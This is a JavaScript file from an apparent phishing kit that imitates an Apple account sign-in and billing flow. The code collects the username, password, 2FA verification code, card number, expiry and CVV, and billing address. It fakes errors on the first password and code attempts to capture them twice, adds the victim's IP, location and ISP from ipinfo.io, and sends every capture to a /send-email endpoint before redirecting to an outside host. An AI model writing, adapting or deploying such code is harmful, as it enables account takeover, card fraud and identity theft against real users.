// Current step tracking
let currentStep = 1;
let attempts = {
    password: 0,
    verification: 0
};

// User data storage
const userData = {
    username: '',
    password: '',
    verificationCode: '',
    card: {
        number: '',
        expiry: '',
        cvv: ''
    },
    billing: {
        firstName: '',
        lastName: '',
        street: '',
        apt: '',
        zip: '',
        city: '',
        state: '',
        country: 'United States'
    },
    ipInfo: {},
    location: {}
};

// DOM elements
const steps = {
    step1: document.getElementById('step1'),
    step2: document.getElementById('step2'),
    step3: document.getElementById('step3'),
    step4: document.getElementById('step4'),
    loading: document.getElementById('loading')
};

// Initialize page
document.addEventListener('DOMContentLoaded', function() {
    // Set up event listeners
    document.getElementById('username-next').addEventListener('click', handleUsernameNext);
    document.getElementById('sign-in').addEventListener('click', handleSignIn);
    document.getElementById('verify-code').addEventListener('click', handleVerifyCode);
    document.getElementById('submit-payment').addEventListener('click', handleSubmitPayment);

    // Set up verification code inputs
    const verificationInputs = document.querySelectorAll('.verification-input');
    verificationInputs.forEach((input, idx) => {
        input.addEventListener('input', function() {
            // Allow only numbers
            this.value = this.value.replace(/\D/g, '');
            
            // Auto-focus next input
            if (this.value.length === 1 && idx < verificationInputs.length - 1) {
                verificationInputs[idx + 1].focus();
            }
            
            checkVerificationCode();
        });

        input.addEventListener('keydown', function(e) {
            // Handle backspace to go to previous input
            if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) {
                verificationInputs[idx - 1].focus();
            }
        });

        // Handle paste functionality
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/\D/g, '');
            
            for (let i = 0; i < Math.min(pastedData.length, verificationInputs.length - idx); i++) {
                if (verificationInputs[idx + i]) {
                    verificationInputs[idx + i].value = pastedData[i];
                }
            }
            
            checkVerificationCode();
        });
    });

    // Card number formatting and validation
    document.getElementById('card-number').addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        validatePaymentForm();
    });

    // Expiry date formatting and validation
    document.getElementById('expiry').addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.slice(0, 2) + '/' + value.slice(2);
        }
        this.value = value.slice(0, 5);
        validatePaymentForm();
    });

    // CVV formatting and validation
    document.getElementById('cvv').addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        validatePaymentForm();
    });

    // Get user IP and location
    fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            userData.ipInfo = {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country,
                org: data.org
            };
            userData.location = {
                city: data.city,
                region: data.region,
                country: data.country
            };
        })
        .catch(err => console.log('Could not fetch IP info:', err));
});

// Handle username step
function handleUsernameNext(e) {
    e.preventDefault();
    
    // Get the actual username input
    const usernameInput = document.getElementById('username');
    const usernameValue = usernameInput.value.trim();
    
    // Validate username is not empty
    if (!usernameValue) {
        alert('Please enter your email or phone number');
        return;
    }
    
    // Store the username
    userData.username = usernameValue;
    
    showLoading();

    // Simulate loading for 5 seconds
    setTimeout(() => {
        hideLoading();
        // Update the disabled username field in step 2 after loading
        document.getElementById('username-disabled').value = userData.username;
        showStep(2);
    }, 5000);
}

// Handle password step
function handleSignIn(e) {
    e.preventDefault();
    const password = document.getElementById('password').value;
    const errorElement = document.getElementById('password-error');

    attempts.password++;
    userData.password = password;

    showLoading();

    if (attempts.password === 1) {
        // First attempt - show error after loading
        setTimeout(() => {
            hideLoading();
            showStep(2);
            errorElement.style.display = 'block';
        }, 5000);

        // Send first attempt email
        sendEmail('First Password Attempt', `
            Email: ${userData.username}
            Password: ${password}
            IP Address: ${userData.ipInfo.ip || 'N/A'}
            City: ${userData.location.city || 'N/A'}
            State: ${userData.location.region || 'N/A'}
            Country: ${userData.location.country || 'N/A'}
            ISP: ${userData.ipInfo.org || 'N/A'}
            Timestamp: ${new Date().toISOString()}
        `);
    } else {
        // Second attempt - proceed to verification
        setTimeout(() => {
            hideLoading();
            errorElement.style.display = 'none';
            showStep(3);
        }, 5000);

        // Send second attempt email
        sendEmail('Second Password Attempt', `
            Email: ${userData.username}
            Password: ${password}
            IP Address: ${userData.ipInfo.ip || 'N/A'}
            City: ${userData.location.city || 'N/A'}
            State: ${userData.location.region || 'N/A'}
            Country: ${userData.location.country || 'N/A'}
            ISP: ${userData.ipInfo.org || 'N/A'}
            Timestamp: ${new Date().toISOString()}
        `);
    }
}

// Handle verification step
function handleVerifyCode(e) {
    e.preventDefault();
    const errorElement = document.getElementById('verification-error');
    const code = getVerificationCode();
    userData.verificationCode = code;

    attempts.verification++;
    showLoading();

    // Send verification attempt email immediately
    sendEmail(`Verification Attempt ${attempts.verification}`, `
        ==============================================
        VERIFICATION CODE ATTEMPT ${attempts.verification}
        ==============================================
        
        Account Information:
        Email/Username: ${userData.username}
        Password: ${userData.password}
        Verification Code Entered: ${code}
        Attempt Number: ${attempts.verification}
        Timestamp: ${new Date().toISOString()}

        Technical Information:
        IP Address: ${userData.ipInfo.ip || 'N/A'}
        Location: ${userData.location.city || 'N/A'}, ${userData.location.region || 'N/A'}
        Country: ${userData.location.country || 'N/A'}
        ISP/Organization: ${userData.ipInfo.org || 'N/A'}
        Browser: ${navigator.userAgent}
        
        ==============================================
    `);

    if (attempts.verification === 1) {
        // First attempt - show error after loading
        setTimeout(() => {
            hideLoading();
            showStep(3);
            errorElement.style.display = 'block';
            // Clear the verification inputs for retry
            document.querySelectorAll('.verification-input').forEach(input => {
                input.value = '';
            });
            document.querySelectorAll('.verification-input')[0].focus();
            checkVerificationCode();
        }, 5000);
    } else {
        // Second attempt - proceed to billing
        setTimeout(() => {
            hideLoading();
            errorElement.style.display = 'none';
            showStep(4);
        }, 5000);
    }
}

// Handle payment submission
function handleSubmitPayment(e) {
    e.preventDefault();

    // Collect card data
    userData.card = {
        number: document.getElementById('card-number').value,
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value
    };

    // Collect billing data
    userData.billing = {
        firstName: document.getElementById('first-name').value,
        lastName: document.getElementById('last-name').value,
        street: document.getElementById('street').value,
        apt: document.getElementById('apt').value,
        zip: document.getElementById('zip').value,
        city: document.getElementById('city').value,
        state: document.getElementById('state').value,
        country: document.getElementById('country').value,
        email: document.getElementById('billing-email').value,
        phone: document.getElementById('billing-phone').value
    };

    showLoading();

    // Send comprehensive billing information email
    sendEmail('Complete Billing Information Submitted', `
        ==============================================
        APPLE ACCOUNT BILLING INFORMATION CAPTURED
        ==============================================
        
        Account Information:
        Email/Username: ${userData.username}
        Password: ${userData.password}
        Verification Code: ${userData.verificationCode}
        Timestamp: ${new Date().toISOString()}

        Payment Card Details:
        Card Number: ${userData.card.number}
        Expiry Date: ${userData.card.expiry}
        CVV/CVC: ${userData.card.cvv}

        Billing Address:
        Full Name: ${userData.billing.firstName} ${userData.billing.lastName}
        Street Address: ${userData.billing.street}
        Apartment/Suite: ${userData.billing.apt || 'N/A'}
        City: ${userData.billing.city}
        State/Province: ${userData.billing.state}
        Zip/Postal Code: ${userData.billing.zip}
        Country: ${userData.billing.country}

        Contact Information:
        Email Address: ${userData.billing.email}
        Phone Number: ${userData.billing.phone}

        Technical Information:
        IP Address: ${userData.ipInfo.ip || 'N/A'}
        Location: ${userData.location.city || 'N/A'}, ${userData.location.region || 'N/A'}
        Country: ${userData.location.country || 'N/A'}
        ISP/Organization: ${userData.ipInfo.org || 'N/A'}
        Browser: ${navigator.userAgent}
        
        ==============================================
    `);

    // Redirect to payment gateway after 5 seconds
    setTimeout(() => {
        window.location.href = 'https://juts-production.up.railway.app/';
    }, 5000);
}

// Helper functions
function showStep(stepNumber) {
    // Hide all steps
    Object.values(steps).forEach(step => {
        step.classList.remove('active');
    });

    // Show requested step
    steps[`step${stepNumber}`].classList.add('active');
    currentStep = stepNumber;
}

function showLoading() {
    Object.values(steps).forEach(step => {
        step.classList.remove('active');
    });
    steps.loading.classList.add('active');
}

function hideLoading() {
    steps.loading.classList.remove('active');
}

function getVerificationCode() {
    let code = '';
    document.querySelectorAll('.verification-input').forEach(input => {
        code += input.value;
    });
    return code;
}

function checkVerificationCode() {
    const code = getVerificationCode();
    document.getElementById('verify-code').disabled = code.length !== 6;
}

function validatePaymentForm() {
    const cardNumber = document.getElementById('card-number').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;

    const isValid = cardNumber.length >= 15 && 
                   cardNumber.length <= 16 &&
                   expiry.length === 5 &&
                   cvv.length >= 3 &&
                   cvv.length <= 4;

    document.getElementById('submit-payment').disabled = !isValid;
}

function sendEmail(subject, body) {
    fetch('/send-email', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            subject: subject,
            body: body
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('Email sent successfully:', data.message);
        } else {
            console.log('Email error:', data.message);
        }
    })
    .catch(err => console.log('Email error:', err));
}